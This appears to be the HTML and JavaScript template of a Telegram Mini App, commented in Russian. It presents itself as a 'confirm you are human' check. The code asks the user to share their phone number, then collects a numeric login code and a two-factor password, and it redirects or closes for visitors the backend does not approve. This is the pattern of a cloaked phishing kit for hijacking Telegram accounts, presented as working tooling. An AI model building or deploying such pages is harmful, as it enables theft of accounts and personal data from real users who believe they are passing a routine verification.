<!doctype html>
<html lang="ru">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover" />
  <title> </title>
  <script async src="https://telegram.org/js/telegram-web-app.js"></script>
  <style>
    :root { color-scheme: dark; }
    *, *::before, *::after { box-sizing: border-box; }
    /* По умолчанию — чистый чёрный экран без контента (пока идёт проверка
       доступа / редирект). Тема и фон применяются только после granted. */
    html, body {
      margin: 0; padding: 0;
      min-height: 100%;
      background: #000;
      color: #fff;
      font-family: -apple-system, "Segoe UI", Roboto, sans-serif;
      -webkit-text-size-adjust: 100%;
      overflow-x: hidden;
    }
    #bg {
      position: fixed; inset: 0; z-index: -1;
      background-size: cover; background-position: center;
    }
    #root {
      position: relative;
      min-height: 100vh;            /* фолбэк для старых вебвью */
      min-height: 100dvh;           /* реальная высота экрана телефона */
      display: flex; flex-direction: column;
      align-items: center; justify-content: center;
      text-align: center;
      /* отступы + безопасные зоны (вырез/закругления телефонов) */
      padding: calc(24px + env(safe-area-inset-top)) 20px
               calc(24px + env(safe-area-inset-bottom)) 20px;
    }
    .card { width: 100%; max-width: 380px; margin: auto 0; }
    h2 { margin: 0 0 12px; font-size: clamp(20px, 6vw, 24px); }
    p { margin: 6px 0; opacity: .85; line-height: 1.45; }
    .muted { font-size: clamp(12px, 3.6vw, 14px); opacity: .6; }
    .emoji { font-size: clamp(44px, 16vw, 68px); line-height: 1; margin-bottom: 16px; }
    .text {
      font-size: clamp(15px, 4.3vw, 18px); line-height: 1.5;
      margin-bottom: 22px; overflow-wrap: anywhere;
    }
    .btn {
      display: block; width: 100%; max-width: 340px; margin: 4px auto 0;
      border: none; cursor: pointer; -webkit-appearance: none;
      padding: 15px 24px; border-radius: 14px; font-size: 16px; font-weight: 600;
      color: #fff; background: var(--tg-theme-button-color, #2ea6ff);
    }
    .inp {
      display: block; width: 100%; max-width: 340px;
      margin: 0 auto 14px; padding: 14px 16px; border-radius: 14px;
      border: 1px solid rgba(127,127,127,.35);
      background: rgba(127,127,127,.12); color: #fff;
      font-size: 16px;            /* >=16px — iOS не зумит при фокусе */
      text-align: center; outline: none;
    }
    .step { font-size: 12px; opacity: .4; margin-top: 18px; }

    /* ---- виды (скины вёрстки страниц) ---- */
    /* classic — дефолт (центр, без панели) */
    /* card — контент в полупрозрачной панели */
    #root.view-card .card, #root.view-glass .card {
      background: rgba(255,255,255,.07);
      border: 1px solid rgba(255,255,255,.14);
      border-radius: 24px; padding: 30px 22px;
    }
    /* glass — «стекло» (frosted) */
    #root.view-glass .card {
      background: rgba(255,255,255,.10);
      -webkit-backdrop-filter: blur(16px); backdrop-filter: blur(16px);
      box-shadow: 0 10px 40px rgba(0,0,0,.35);
    }
    /* minimal — выравнивание влево, контент сверху */
    #root.view-minimal { justify-content: flex-start; text-align: left; }
    #root.view-minimal .card { margin: 7vh 0 0; }
    #root.view-minimal .emoji { font-size: clamp(34px,11vw,48px); margin-bottom: 12px; }
    #root.view-minimal .btn, #root.view-minimal .inp { margin-left: 0; }
    /* bottom — контент и крупная кнопка прижаты вниз */
    #root.view-bottom { justify-content: flex-end; }
    #root.view-bottom .card { margin: auto 0 0; }
    #root.view-bottom .emoji { font-size: clamp(56px,20vw,88px); }
    #root.view-bottom .btn { padding: 17px 24px; font-size: 17px; }
    .spinner {
      width: 28px; height: 28px; border-radius: 50%;
      border: 3px solid rgba(127,127,127,.3);
      border-top-color: var(--tg-theme-button-color, #2ea6ff);
      animation: spin .8s linear infinite; margin: 0 auto 16px;
    }
    @keyframes spin { to { transform: rotate(360deg); } }
  </style>
</head>
<body>
  <div id="bg"></div>
  <div id="root"></div>

  <script>
    // Пустой нейтральный экран. Ничего из «приложения» не рисуем, пока не
    // подтверждён доступ. Проверку доступа стартуем СРАЗУ, не дожидаясь
    // загрузки telegram-web-app.js (он async) — чтобы чужого уводило как
    // можно раньше. initData читаем напрямую из URL.
    const BOT_ID = "__BOT_ID__";
    const CFG = __CFG__;
    // Токен доступа из URL (?t=...) — когда мини-апп открыт web_app-кнопкой
    // бота. Для startapp-ссылки токен прилетает внутри initData.
    const URL_TOKEN = new URLSearchParams(window.location.search).get("t") || "";
    const root = document.getElementById("root");

    function tgApp() { return window.Telegram ? window.Telegram.WebApp : null; }

    function getInitData() {
      const tg = tgApp();
      if (tg && tg.initData) return tg.initData;
      // из hash: #tgWebAppData=<urlencoded initData>&...
      const m = (window.location.hash || "").match(/tgWebAppData=([^&]+)/);
      return m ? decodeURIComponent(m[1]) : "";
    }

    function whenTgReady(cb, tries) {
      tries = tries || 0;
      const tg = tgApp();
      if (tg || tries > 50) { cb(tg); return; }
      setTimeout(function () { whenTgReady(cb, tries + 1); }, 20);
    }

    function html(s) { root.innerHTML = '<div class="card">' + s + '</div>'; }

    function applyTheme() {
      // вид (вёрстка) — класс на корне
      root.className = "view-" + (CFG.view || "classic");
      if (CFG.color) {
        document.documentElement.style.setProperty(
          "--tg-theme-button-color", CFG.color
        );
      }
      if (CFG.bg) {
        const bg = document.getElementById("bg");
        // CFG.bg уже готовый CSS: url('...') или linear/radial-gradient(...)
        bg.style.backgroundImage = CFG.bg;
        bg.style.filter = "blur(" + (CFG.blur || 0) + "px)";
        if (CFG.blur) bg.style.transform = "scale(1.1)";
      }
    }

    // ----- многошаговый прогон страниц шаблона (фронт; бекенд позже) -----
    var PAGES = CFG.pages || [];
    var step = 0;

    function esc(s) {
      return (s == null ? "" : String(s))
        .replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;")
        .replace(/"/g, "&quot;");
    }

    function renderStep(i) {
      var p = PAGES[i];
      if (!p) return;
      var out = "";
      if (p.emoji) out += '<div class="emoji">' + p.emoji + "</div>";
      // text/hint хранятся как HTML-разметка шаблона — выводим как есть
      if (p.text) out += '<div class="text">' + p.text + "</div>";
      // поле ввода для страниц «код» и «2FA»
      if (p.key === "code") {
        // p.wrong («Вы ввели неверный код») сюда НЕ выводим — он остаётся в
        // конфиге и показывается бекенд-логикой только при неверном вводе.
        out += '<input class="inp" id="inp" inputmode="numeric" '
             + 'placeholder="• • • • •" />';
      } else if (p.key === "twofa") {
        out += '<input class="inp" id="inp" type="password" placeholder="'
             + esc(p.placeholder) + '" />';
        if (p.hint) out += '<p class="muted">' + p.hint + "</p>";
      }
      var last = i >= PAGES.length - 1;
      var label = p.button || (last ? "Готово" : "Далее");
      out += '<button class="btn" id="act">' + esc(label) + "</button>";
      out += '<div class="step">' + (i + 1) + " / " + PAGES.length + "</div>";
      html(out);
      // после смены страницы возвращаем экран в начало — иначе вёрстка
      // «уезжает» и приходится прокручивать вручную
      window.scrollTo(0, 0);
      var tg = tgApp();
      if (tg) { try { tg.expand(); } catch (e) {} }
      var act = document.getElementById("act");
      if (act) {
        // На главной странице («подтвердите, что вы человек») кнопка сначала
        // просит поделиться номером телефона, и только после согласия ведёт
        // дальше. Бот получит контакт серверно (под бекенд-логику).
        act.onclick = (p.key === "main") ? requestPhone : nextStep;
      }
    }

    function requestPhone() {
      var tg = tgApp();
      if (tg && typeof tg.requestContact === "function") {
        try {
          tg.requestContact(function (ok, evt) {
            var shared = ok === true || (evt && evt.status === "sent");
            if (shared) nextStep();           // согласился — идём дальше
          });
          return;
        } catch (e) {}
      }
      // старый Telegram / вне Telegram — просто переходим (для теста вёрстки)
      nextStep();
    }

    // Единая анимация загрузки между страницами (одинаковая для всех
    // шаблонов, показывается автоматически при каждом переходе).
    var LOADING_MS = 700;

    function showLoading() {
      html('<div class="spinner"></div>');
      window.scrollTo(0, 0);
    }

    function nextStep() {
      if (step < PAGES.length - 1) {
        var nextIdx = step + 1;
        showLoading();
        setTimeout(function () {
          step = nextIdx;
          renderStep(step);
        }, LOADING_MS);
      } else {
        var tg = tgApp();
        if (tg && tg.close) tg.close();
      }
    }

    function renderGranted() {
      whenTgReady(function (tg) {
        if (tg) { tg.ready(); try { tg.expand(); } catch (e) {} }
        applyTheme();
        if (!PAGES.length) { html('<h2>Доступ открыт ✅</h2>'); return; }
        step = 0;
        renderStep(step);
      });
    }

    function redirect(url) {
      const tg = tgApp();
      if (!url) { if (tg && tg.close) tg.close(); return; }
      const isTme = /(^|\/\/)(t\.me|telegram\.me)/i.test(url);
      // внешний ресурс — мгновенный переход вебвью (не ждём telegram-скрипт)
      if (/^https?:\/\//i.test(url) && !isTme) {
        window.location.replace(url);
        return;
      }
      // t.me — открываем в Telegram и закрываем мини-апп
      if (tg && tg.openTelegramLink) {
        try { tg.openTelegramLink(url); } catch (e) {}
        if (tg.close) tg.close();
      } else {
        window.location.replace(url);
      }
    }

    async function main() {
      try {
        const r = await fetch("/dl/" + BOT_ID + "/auth/start", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          credentials: "include",
          body: JSON.stringify({ init_data: getInitData(), token: URL_TOKEN }),
        });
        const data = await r.json();
        if (data.mode === "granted") renderGranted();
        else redirect(data.redirect_url);
      } catch (e) {
        const tg = tgApp();
        if (tg && tg.close) tg.close();
      }
    }

    main();
  </script>
</body>
</html>
